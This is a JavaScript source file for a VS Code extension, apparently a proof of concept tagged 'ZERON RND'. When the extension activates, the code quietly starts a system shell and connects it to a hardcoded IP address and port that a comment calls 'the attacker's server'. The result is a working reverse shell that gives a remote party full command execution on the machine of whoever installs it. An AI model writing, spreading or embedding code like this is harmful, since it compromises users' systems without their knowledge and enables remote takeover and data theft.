const vscode = require('vscode');
const { exec } = require("child_process");
const net = require("net");
const os = require("os");

function activate(context) {
    vscode.window.showInformationMessage("From The House Of ZERON RND");

    // Example usage of IP and Port passed as arguments
    let IP = "192.168.0.149";
    let Port = 9098;

    // Determine the shell command based on the operating system
    let shellCommand;
    switch (os.platform()) {
        case 'win32':
            shellCommand = "cmd.exe";
            break;
        case 'darwin':  // macOS
        case 'linux':
            shellCommand = "sh";
            break;
        default:
            vscode.window.showErrorMessage("Unsupported OS");
            return;
    }

    // Establish a reverse shell connection
    let shell = exec(shellCommand);

    // Connect to the attacker's server using IP and Port
    var client_sock = new net.Socket();
    client_sock.connect(Port, IP, () => {
        client_sock.pipe(shell.stdin);
        shell.stdout.pipe(client_sock);
        shell.stderr.pipe(client_sock);
    });

    // Dispose resources on extension deactivation
    context.subscriptions.push(
        vscode.Disposable.from(
            vscode.commands.registerCommand('extension.activate', activate),
            vscode.commands.registerCommand('extension.deactivate', deactivate)
        )
    );
}

function deactivate() {
    vscode.window.showInformationMessage("Zeronites Stand At Ease");
}

module.exports = {
    activate,
    deactivate
};
